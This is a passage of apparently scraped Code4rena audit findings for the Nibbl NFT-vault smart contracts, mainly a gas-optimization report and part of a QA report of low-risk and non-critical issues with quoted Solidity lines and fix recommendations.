https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/AccessControlMechanism.sol#L19  Tool Used Manual review  Recommendation Mitigation Steps i suggest to add state admin, so that the constructor can work to initialize param admin. and make it immutable   #5 constructor cant initialize the state Impact the constructor initialize _vaultImplementation, _feeTo, and _basketImplementation but the states was missing, and caused of it made constructor doesn't work properly.  Proof  of Concept https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L23  Tool Used Manual review  Recommendation Mitigation Steps i suggest to add state _vaultImplementation, _feeTo, and _basketImplementation, so that the constructor can work to initialize  _vaultImplementation, _feeTo, and _basketImplementation. and make it immutable    "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/140", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "## Summary  ### Gas Optimizations | |Issue|Instances| |-|:-|:-:| | 1 | Setting `DEFAULT_ADMIN_ROLE` as the role admin is redundant | 1 | | 2 | Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas | 23 | | 3 | Using `storage` instead of `memory` for structs/arrays saves gas | 2 | | 4 | State variables should be cached in stack variables rather than re-reading them from storage | 1 | | 5 | `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables | 7 | | 6 | `internal` functions only called once can be inlined to save gas | 1 | | 7 | Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement | 5 | | 8 | `<array>.length` should not be looked up in every loop of a `for`-loop | 6 | | 9 | `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops | 6 | | 10 | `require()`/`revert()` strings longer than 32 bytes cost extra gas | 7 | | 11 | Using `bool`s for storage incurs overhead | 1 | | 12 | Use a more recent version of solidity | 1 | | 13 | `>=` costs less gas than `>` | 1 | | 14 | It costs more gas to initialize non-`constant`/non-`immutable` variables to zero than to let the default of zero be applied | 6 | | 15 | `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) | 6 | | 16 | Splitting `require()` statements that use `&&` saves gas | 4 | | 17 | Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead | 14 | | 18 | Using `private` rather than `public` for constants, saves gas | 3 | | 19 | Don't use `SafeMath` once the solidity version is 0.8.0 or greater | 1 | | 20 | Duplicated `require()`/`revert()` checks should be refactored to a modifier or function | 3 | | 21 | Empty blocks should be removed or emit something | 5 | | 22 | Use custom errors rather than `revert()`/`require()` strings to save gas | 41 | | 23 | Functions guaranteed to revert when called by normal users can be marked `payable` | 8 |  Total: 153 instances over 23 issues   ## Gas Optimizations  ### 1. Setting `DEFAULT_ADMIN_ROLE` as the role admin is redundant `DEFAULT_ADMIN_ROLE` is [automatically](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/83277ff916ac4f58fec072b8f28a252c1245c2f1/contracts/access/AccessControl.sol#L40-L48) designated as the role admin of any new role, so setting it again is a waste of gas since it involves fetching role-related state variables, updating state variables, and emitting an event  *There is 1 instance of this issue:* ```solidity File: contracts/Utilities/AccessControlMechanism.sol   #1  22           _setRoleAdmin(_defaultAdminRole, _defaultAdminRole); 23           _setRoleAdmin(FEE_ROLE, _defaultAdminRole); 24           _setRoleAdmin(PAUSER_ROLE, _defaultAdminRole); 25:          _setRoleAdmin(IMPLEMENTER_ROLE, _defaultAdminRole); ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/AccessControlMechanism.sol#L22-L25  ### 2. Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas When a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution.   If the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one  *There are 23 instances of this issue:* ```solidity File: contracts/Basket.sol  41:       function withdrawMultipleERC721(address[] memory _tokens, uint256[] memory _tokenId, address _to) external override {  41:       function withdrawMultipleERC721(address[] memory _tokens, uint256[] memory _tokenId, address _to) external override {  68:       function withdrawMultipleERC1155(address[] memory _tokens, uint256[] memory _tokenIds, address _to) external override {  68:       function withdrawMultipleERC1155(address[] memory _tokens, uint256[] memory _tokenIds, address _to) external override {  91:       function withdrawMultipleERC20(address[] memory _tokens) external override {  99:       function onERC721Received(address, address from, uint256 id, bytes memory) external override returns(bytes4) {  104:      function onERC1155Received(address, address from, uint256 id, uint256 amount, bytes memory) external virtual override returns (bytes4) {  109:      function onERC1155BatchReceived(address, address from, uint256[] memory ids, uint256[] memory amounts, bytes memory) external virtual override returns (bytes4) {  109:      function onERC1155BatchReceived(address, address from, uint256[] memory ids, uint256[] memory amounts, bytes memory) external virtual override returns (bytes4) {  109:      function onERC1155BatchReceived(address, address from, uint256[] memory ids, uint256[] memory amounts, bytes memory) external virtual override returns (bytes4) { ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L41  ```solidity File: contracts/NibblVaultFactory.sol  41:           string memory _name,  42:           string memory _symbol, ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L41  ```solidity File: contracts/NibblVault.sol  174:          string memory _tokenName,   175:          string memory _tokenSymbol,   504:      function withdrawMultipleERC721(address[] memory _assetAddresses, uint256[] memory _assetIDs, address _to) external override boughtOut {  504:      function withdrawMultipleERC721(address[] memory _assetAddresses, uint256[] memory _assetIDs, address _to) external override boughtOut {  523:      function withdrawMultipleERC20(address[] memory _assets, address _to) external override boughtOut {  545:      function withdrawMultipleERC1155(address[] memory _assets, uint256[] memory _assetIDs, address _to) external override boughtOut {  545:      function withdrawMultipleERC1155(address[] memory _assets, uint256[] memory _assetIDs, address _to) external override boughtOut {  577:      function onERC1155Received(address, address, uint256, uint256, bytes memory) external pure returns (bytes4) {  581:      function onERC1155BatchReceived(address, address, uint256[] memory, uint256[] memory, bytes memory) external pure returns (bytes4) {  581:      function onERC1155BatchReceived(address, address, uint256[] memory, uint256[] memory, bytes memory) external pure returns (bytes4) {  581:      function onERC1155BatchReceived(address, address, uint256[] memory, uint256[] memory, bytes memory) external pure returns (bytes4) { ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L174  ### 3. Using `storage` instead of `memory` for structs/arrays saves gas When fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct  *There are 2 instances of this issue:* ```solidity File: contracts/Twav/Twav.sol   #1  38:               TwavObservation memory _twavObservationCurrent = twavObservations[(_index)]; ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L38  ```solidity File: contracts/Twav/Twav.sol   #2  39:               TwavObservation memory _twavObservationPrev = twavObservations[(_index + 1) % TWAV_BLOCK_NUMBERS]; ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L39  ### 4. State variables should be cached in stack variables rather than re-reading them from storage The instances below point to the second+ access of a state variable within a function. Caching of a state variable replace each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.  *There is 1 instance of this issue:* ```solidity File: contracts/NibblVault.sol   #1  /// @audit secondaryReserveBalance on line 225 226:          secondaryReserveRatio = uint32((secondaryReserveBalance * SCALE * 1e18) / (initialTokenSupply * initialTokenPrice)); //secondaryReserveRatio is updated on every trade  ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L226  ### 5. `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables  *There are 7 instances of this issue:* ```solidity File: contracts/NibblVault.sol  219:          feeAccruedCurator += _feeCurator;  225:          secondaryReserveBalance += _feeCurve;  242:          feeAccruedCurator += _feeCurator;  320:                  secondaryReserveBalance += _lowerCurveDiff;  380:                  primaryReserveBalance -= _saleReturn;  429:              totalUnsettledBids += _buyoutValuationDeposit;  457:          totalUnsettledBids -= _amount; ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L219  ### 6. `internal` functions only called once can be inlined to save gas Not inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.  *There is 1 instance of this issue:* ```solidity File: contracts/Utilities/EIP712Base.sol   #1  27:       function getChainID() internal view returns (uint256 id) { ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/EIP712Base.sol#L27  ### 7. Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement `require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`  *There are 5 instances of this issue:* ```solidity File: contracts/NibblVault.sol  /// @audit require() on line 185 201:          curatorFee = (((_secondaryReserveRatio - MIN_SECONDARY_RESERVE_RATIO) * MIN_CURATOR_FEE) / (primaryReserveRatio - MIN_SECONDARY_RESERVE_RATIO)) + MIN_CURATOR_FEE; //curator fee is proportional to the secondary reserve ratio/primaryReseveRatio i.e. initial liquidity added by curator  /// @audit require() on line 404 406:          buyoutValuationDeposit = msg.value - (_buyoutBid - _currentValuation);  /// @audit require() on line 404 415:              safeTransferETH(payable(msg.sender), (_buyoutBid - _currentValuation));  /// @audit if-condition on line 373 378:                  uint256 _tokensPrimaryCurve = _totalSupply - _initialTokenSupply;  /// @audit if-condition on line 414 415:              safeTransferETH(payable(msg.sender), (_buyoutBid - _currentValuation)); ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L201  ### 8. `<array>.length` should not be looked up in every loop of a `for`-loop The overheads outlined below are _PER LOOP_, excluding the first loop * storage arrays incur a Gwarmaccess (**100 gas**) * memory arrays use `MLOAD` (**3 gas**) * calldata arrays use `CALLDATALOAD` (**3 gas**)  Caching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset  *There are 6 instances of this issue:* ```solidity File: contracts/Basket.sol  43:           for (uint256 i = 0; i < _tokens.length; i++) {  70:           for (uint256 i = 0; i < _tokens.length; i++) {  93:           for (uint256 i = 0; i < _tokens.length; i++) { ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L43  ```solidity File: contracts/NibblVault.sol  506:          for (uint256 i = 0; i < _assetAddresses.length; i++) {  525:          for (uint256 i = 0; i < _assets.length; i++) {  547:          for (uint256 i = 0; i < _assets.length; i++) { ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L506  ### 9. `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**  *There are 6 instances of this issue:* ```solidity File: contracts/Basket.sol  43:           for (uint256 i = 0; i < _tokens.length; i++) {  70:           for (uint256 i = 0; i < _tokens.length; i++) {  93:           for (uint256 i = 0; i < _tokens.length; i++) { ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L43  ```solidity File: contracts/NibblVault.sol  506:          for (uint256 i = 0; i < _assetAddresses.length; i++) {  525:          for (uint256 i = 0; i < _assets.length; i++) {  547:          for (uint256 i = 0; i < _assets.length; i++) { ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L506  ### 10. `require()`/`revert()` strings longer than 32 bytes cost extra gas Each extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**  *There are 7 instances of this issue:* ```solidity File: contracts/NibblVaultFactory.sol  48:           require(msg.value >= MIN_INITIAL_RESERVE_BALANCE, \"NibblVaultFactory: Initial reserve balance too low\");  49:           require(IERC721(_assetAddress).ownerOf(_assetTokenID) == msg.sender, \"NibblVaultFactory: Invalid sender\");  107:          require(basketUpdateTime != 0 && block.timestamp >= basketUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");  131:          require(feeToUpdateTime != 0 && block.timestamp >= feeToUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");  141:          require(_newFee <= MAX_ADMIN_FEE, \"NibblVaultFactory: Fee value greater than MAX_ADMIN_FEE\");  149:          require(feeAdminUpdateTime != 0 && block.timestamp >= feeAdminUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");  166:          require(vaultUpdateTime != 0 && block.timestamp >= vaultUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L48  ### 11. Using `bool`s for storage incurs overhead ```solidity     // Booleans are more expensive than uint256 or any type that takes up a full     // word because each write operation emits an extra SLOAD to first read the     // slot's contents, replace the bits taken up by the boolean, and then write     // back. This is the compiler's defense against contract upgrades and     // pointer aliasing, and it cannot be disabled. ``` https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27 Use `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from 'false' to 'true', after having been 'true' in the past  *There is 1 instance of this issue:* ```solidity File: contracts/Utilities/AccessControlMechanism.sol   #1  16:       mapping(bytes32 => mapping(address => bool)) public pendingRoles; ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/AccessControlMechanism.sol#L16  ### 12. Use a more recent version of solidity Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value  *There is 1 instance of this issue:* ```solidity File: contracts/Utilities/AccessControlMechanism.sol   #1  4:    pragma solidity ^0.8.0; ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/AccessControlMechanism.sol#L4  ### 13. `>=` costs less gas than `>` The compiler uses opcodes `GT` and `ISZERO` for solidity code that uses `>`, but only requires `LT` for `>=`, [which saves **3 gas**](https://gist.github.com/IllIllI000/3dc79d25acccfa16dee4e83ffdc6ffde)  *There is 1 instance of this issue:* ```solidity File: contracts/NibblVault.sol   #1  224:          _feeCurve = _maxSecondaryBalanceIncrease > _feeCurve ? _feeCurve : _maxSecondaryBalanceIncrease; // the curve fee is capped so that secondaryReserveBalance <= fictitiousPrimaryReserveBalance ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L224  ### 14. It costs more gas to initialize non-`constant`/non-`immutable` variables to zero than to let the default of zero be applied Not overwriting the default for [stack variables](https://gist.github.com/IllIllI000/e075d189c1b23dce256cd166e28f3397) saves **8 gas**. Storage and memory variables have larger savings  *There are 6 instances of this issue:* ```solidity File: contracts/Basket.sol  43:           for (uint256 i = 0; i < _tokens.length; i++) {  70:           for (uint256 i = 0; i < _tokens.length; i++) {  93:           for (uint256 i = 0; i < _tokens.length; i++) { ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L43  ```solidity File: contracts/NibblVault.sol  506:          for (uint256 i = 0; i < _assetAddresses.length; i++) {  525:          for (uint256 i = 0; i < _assets.length; i++) {  547:          for (uint256 i = 0; i < _assets.length; i++) { ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L506  ### 15. `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) Saves **6 gas per loop**  *There are 6 instances of this issue:* ```solidity File: contracts/Basket.sol  43:           for (uint256 i = 0; i < _tokens.length; i++) {  70:           for (uint256 i = 0; i < _tokens.length; i++) {  93:"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/139", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "## Summary  ### Low Risk Issues | |Issue|Instances| |-|:-|:-:| | 1 | Buyouts that occur during the timestamp wrap will have valuation errors | 1 | | 2 | `ecrecover()` not checked for signer address of zero | 1 | | 3 | Return values of `transfer()`/`transferFrom()` not checked | 4 | | 4 | Input array lengths may differ | 4 | | 5 | `_safeMint()` should be used rather than `_mint()` wherever possible | 1 | | 6 | Missing checks for `address(0x0)` when assigning values to `address` state variables | 6 | | 7 | Vulnerable to cross-chain replay attacks due to static `DOMAIN_SEPARATOR`/`domainSeparator` | 1 | | 8 | Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions | 1 | | 9 | Incorrect comments | 3 |  Total: 22 instances over 9 issues  ### Non-critical Issues | |Issue|Instances| |-|:-|:-:| | 1 | Consider addings checks for signature malleability | 1 | | 2 | Misleading variable name | 1 | | 3 | Inconsistent version of English being used | 2 | | 4 | Missing `initializer` modifier on constructor | 1 | | 5 | Contract implements interface without extending the interface | 1 | | 6 | `require()`/`revert()` statements should have descriptive reason strings | 1 | | 7 | `public` functions not called by the contract should be declared `external` instead | 3 | | 8 | Non-assembly method available | 1 | | 9 | `2**<n> - 1` should be re-written as `type(uint<n>).max` | 4 | | 10 | `constant`s should be defined rather than using magic numbers | 10 | | 11 | Cast is more restrictive than the type of the variable being assigned | 1 | | 12 | Missing event and or timelock for critical parameter change | 4 | | 13 | Expressions for constant values such as a call to `keccak256()`, should use `immutable` rather than `constant` | 5 | | 14 | Inconsistent spacing in comments | 27 | | 15 | Lines are too long | 14 | | 16 | Non-library/interface files should use fixed compiler versions, not floating ones | 1 | | 17 | Typos | 14 | | 18 | File is missing NatSpec | 1 | | 19 | NatSpec is incomplete | 12 | | 20 | Event is missing `indexed` fields | 5 |  Total: 109 instances over 20 issues   ## Low Risk Issues  ### 1. Buyouts that occur during the timestamp wrap will have valuation errors The `_blockTimestamp` has a modulo applied, so at some point, there will be a timestamp with a value close to 2^32, followed by a timestamp close to zero. The `_updateTWAV` function does an unchecked subtraction of the two timestamps, so this will lead to an underflow, making the valuation based on a long time period rather than the actual one. Until more TWAV entries are added, valuations will be wrong  *There is 1 instance of this issue:* ```solidity File: contracts/NibblVault.sol   #1  303              uint32 _blockTimestamp = uint32(block.timestamp % 2**32); 304              if (_blockTimestamp != lastBlockTimeStamp) { 305:                 _updateTWAV(getCurrentValuation(), _blockTimestamp);    ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L303-L305  ### 2. `ecrecover()` not checked for signer address of zero The `ecrecover()` function returns an address of zero when the signature does not match. This can cause problems if address zero is ever the owner of assets, and someone uses the permit function on address zero. If that happens, any invalid signature will pass the checks, and the assets will be stealable. In this case, the asset of concern is the vault's ERC20 token, and fortunately OpenZeppelin's implementation does a good job of making sure that address zero is never able to have a positive balance. If this contract ever changes to another ERC20 implementation that is laxer in its checks in favor of saving gas, this code may become a problem.  *There is 1 instance of this issue:* ```solidity File: contracts/NibblVault.sol   #1  563:         address signer = ecrecover(toTypedMessageHash(structHash), v, r, s); ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L563  ### 3. Return values of `transfer()`/`transferFrom()` not checked Not all `IERC20` implementations `revert()` when there's a failure in `transfer()`/`transferFrom()`. The function signature has a `boolean` return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually making a payment  *There are 4 instances of this issue:* ```solidity File: contracts/Basket.sol   #1  87:           IERC20(_token).transfer(msg.sender, IERC20(_token).balanceOf(address(this))); ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L87  ```solidity File: contracts/Basket.sol   #2  94:               IERC20(_tokens[i]).transfer(msg.sender, IERC20(_tokens[i]).balanceOf(address(this))); ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L94  ```solidity File: contracts/NibblVault.sol   #3  517:          IERC20(_asset).transfer(_to, IERC20(_asset).balanceOf(address(this))); ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L517  ```solidity File: contracts/NibblVault.sol   #4  526:              IERC20(_assets[i]).transfer(_to, IERC20(_assets[i]).balanceOf(address(this))); ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L526  ### 4. Input array lengths may differ If the caller makes a copy-paste error, the lengths may be mismatchd and an operation believed to have been completed may not in fact have been completed  *There are 4 instances of this issue:* ```solidity File: contracts/Basket.sol   #1  41:      function withdrawMultipleERC721(address[] memory _tokens, uint256[] memory _tokenId, address _to) external override { ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L41  ```solidity File: contracts/Basket.sol   #2  68:      function withdrawMultipleERC1155(address[] memory _tokens, uint256[] memory _tokenIds, address _to) external override { ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L68  ```solidity File: contracts/NibblVault.sol   #3  545:     function withdrawMultipleERC1155(address[] memory _assets, uint256[] memory _assetIDs, address _to) external override boughtOut { ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L545  ```solidity File: contracts/NibblVault.sol   #4  504:     function withdrawMultipleERC721(address[] memory _assetAddresses, uint256[] memory _assetIDs, address _to) external override boughtOut { ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L504  ### 5. `_safeMint()` should be used rather than `_mint()` wherever possible `_mint()` is [discouraged](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d4d8d2ed9798cc3383912a23b5e8d5cb602f7d4b/contracts/token/ERC721/ERC721.sol#L271) in favor of `_safeMint()` which ensures that the recipient is either an EOA or implements `IERC721Receiver`. Both [OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d4d8d2ed9798cc3383912a23b5e8d5cb602f7d4b/contracts/token/ERC721/ERC721.sol#L238-L250) and [solmate](https://github.com/Rari-Capital/solmate/blob/4eaf6b68202e36f67cab379768ac6be304c8ebde/src/tokens/ERC721.sol#L180) have versions of this function  *There is 1 instance of this issue:* ```solidity File: contracts/Basket.sol   #1  24:           _mint(_curator, 0); ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L24  ### 6. Missing checks for `address(0x0)` when assigning values to `address` state variables  *There are 6 instances of this issue:* ```solidity File: contracts/NibblVault.sol  191:          assetAddress = _assetAddress;  193:          curator = _curator;  487:          curator = _newCurator; ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L191  ```solidity File: contracts/NibblVaultFactory.sol  100:         pendingBasketImplementation = _newBasketImplementation;  124:         pendingFeeTo = _newFeeAddress;  159:         pendingVaultImplementation = _newVaultImplementation; ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L100  ### 7. Vulnerable to cross-chain replay attacks due to static `DOMAIN_SEPARATOR`/`domainSeparator` See [this](https://github.com/code-423n4/2021-04-maple-findings/issues/2) issue from a prior contest for details  *There is 1 instance of this issue:* ```solidity File: contracts/Utilities/EIP712Base.sol   #1  15       function INIT_EIP712(string memory name, string memory version) internal { 16           domainSeperator = keccak256( 17               abi.encode( 18                   EIP712_DOMAIN_TYPEHASH, 19                   keccak256(bytes(name)), 20                   keccak256(bytes(version)), 21                   getChainID(), 22                   address(this) 23               ) 24           ); 25:      } ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/EIP712Base.sol#L15-L25  ### 8. Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions See [this](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps) link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future.  *There is 1 instance of this issue:* ```solidity File: contracts/NibblVault.sol   #1  20:   contract NibblVault is INibblVault, BancorFormula, ERC20Upgradeable, Twav, EIP712Base { ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L20  ### 9. Incorrect comments  *There are 3 instances of this issue:* ```solidity File: contracts/Basket.sol   #1  /// @audit ERC1155, not ERC721 58:      /// @notice withdraw an ERC721 token from this contract into your wallet ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L58  ```solidity File: contracts/Twav/Twav.sol   #2  /// @audit or zero if there have been fewer than four blocks 34:      /// @return _twav TWAV of the last 4 blocks ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L34  ```solidity File: contracts/Twav/Twav.sol   #3  /// @audit of the last four updates, not necessarily of the last four blocks (i.e. may be blocked that were skipped) 34:      /// @return _twav TWAV of the last 4 blocks ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L34  ## Non-critical Issues  ### 1. Consider addings checks for signature malleability Use OpenZeppelin's `ECDSA` contract rather than calling `ecrecover()` directly  *There is 1 instance of this issue:* ```solidity File: contracts/NibblVault.sol   #1  563:         address signer = ecrecover(toTypedMessageHash(structHash), v, r, s); ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L563  ### 2. Misleading variable name `_twavObservationPrev` is not the previous observation - it's more like the trailing, or next-to-expire TWAV observation`  *There is 1 instance of this issue:* ```solidity File: contracts/Twav/Twav.sol   #1  39:              TwavObservation memory _twavObservationPrev = twavObservations[(_index + 1) % TWAV_BLOCK_NUMBERS]; ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L39  ### 3. Inconsistent version of English being used Some functions use American English, whereas others use British English. A single project should use only one of the two  *There are 2 instances of this issue:* ```solidity File: contracts/NibblVault.sol   #1  173:     function initialize( ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L173  ```solidity File: contracts/Interfaces/IBasket.sol   #2  10:      function initialise(address _curator) external; ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Interfaces/IBasket.sol#L10  ### 4. Missing `initializer` modifier on constructor OpenZeppelin [recommends](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/5) that the `initializer` modifier be applied to constructors in order to avoid potential griefs, [social engineering](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/4), or exploits. Ensure that the modifier is applied to the implementation contract. If the default constructor is currently being used, it should be changed to be an explicit one with the modifier applied.  *There is 1 instance of this issue:* ```solidity File: contracts/Basket.sol   #1  13:   contract Basket is IBasket, ERC721(\"NFT Basket\", \"NFTB\"), Initializable { ``` https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L13  ### 5. Contract implements interface without extending the interface Not extending the interface may lead to the wrong function signature being used, leading to unexpected behavior. If the interface is in fact being implemented, use the `override` keyword to indicate that fact  *There is 1 instance of this issue:* ```solidity File: 